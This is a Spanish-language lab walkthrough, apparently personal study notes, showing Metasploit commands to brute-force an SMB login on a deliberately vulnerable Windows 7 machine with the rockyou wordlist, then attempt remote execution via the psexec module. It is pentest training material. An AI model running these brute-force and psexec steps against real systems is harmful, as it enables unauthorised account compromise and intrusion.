Maquina que vamos a utilizar **Kali Linux y Windows 7 vulnerable** ([https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing](https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing))  
  
Realizaremos un ataque al protocolo SMB utilizando metasploit, donde podremos utilizar un diccionario para probar a una alta velocidad si encuentra la contraseña para acceder a este protocolo y enumerar los recursos compartidos en el sistema.  

  

```Bash
sudo arp-scan -I eth0 --localnet
```

![[Imagenes/image 44.png|image 44.png]]

  

- Abrimos el Metasploit.
    
    Tenemos que entender que el Metasploit no solo sirve para explotar vulnerabilidades **también podemos utilizarlo para ataques de fuerza bruta, iniciar sesión mediante SSH , SMB, Pivoting, etc**…
    
    ![[Imagenes/image 1 33.png|image 1 33.png]]
    
      
    
- Haremos un ataque de fuerza bruta al protocolo SMB. Usaremos un modulo llamado
    
    - `use auxiliary/scanner/smb/smb_login`
        
        ![[Imagenes/image 2 32.png|image 2 32.png]]
        
          
        
    - `show options`
        
        ![[Imagenes/image 3 31.png|image 3 31.png]]
        
    
      
    
    - `set RHOST 10.0.3.6`
    - `set VERBOSE false` . Hacemos esto para que no muestre la información del ataque hasta que terminé , con esto logramos que vaya mas rápido el ataque.
    - `set SMBUser mario` . Vamos a suponer que se el usuario pero no la contraseña.
    - `set PASS_FILE /usr/share/wordlists/rockyou.txt` . Cargamos el diccionario .
        
        ![[Imagenes/image 4 30.png|image 4 30.png]]
        
    
      
    
    - `show options`
        
        ![[Imagenes/image 5 29.png|image 5 29.png]]
        
    
      
    
    - `run`
        
        ![[Imagenes/image 6 27.png|image 6 27.png]]
        

  

- Una vez que tenemos un usuario y una contraseña hay que intentar **iniciar sesión median PsExec** que dependerá si la maquina victima lo tiene habilitado o no. Usaremos el modulo `exploit/windows/smb/psexec`
    
    > [!important] **PsExec** implica ejecutar comandos o procesos en un sistema remoto desde tu máquina local. PsExec es una herramienta de Sysinternals desarrollada por Microsoft que permite la administración remota sin necesidad de instalar software adicional en el sistema remoto.<br><br>
    

- `use exploit/windows/smb/psexec`
- `show options`
    
    ![[Imagenes/image 7 25.png|image 7 25.png]]
    

  

- `set RHOSTS 10.0.3.6`
- `set SMBPass 123123`
- `set SMBUser mario`
- `show options`
    
    ![[Imagenes/image 8 23.png|image 8 23.png]]
    
      
    
    Hay que verificar que los siguientes datos estén bien.
    
    ![[Imagenes/image 9 21.png|image 9 21.png]]
    

  

- `run`
    
    ![[Imagenes/image 10 19.png|image 10 19.png]]
    
    Vemos que no funciona en este caso pero es importante probarlo.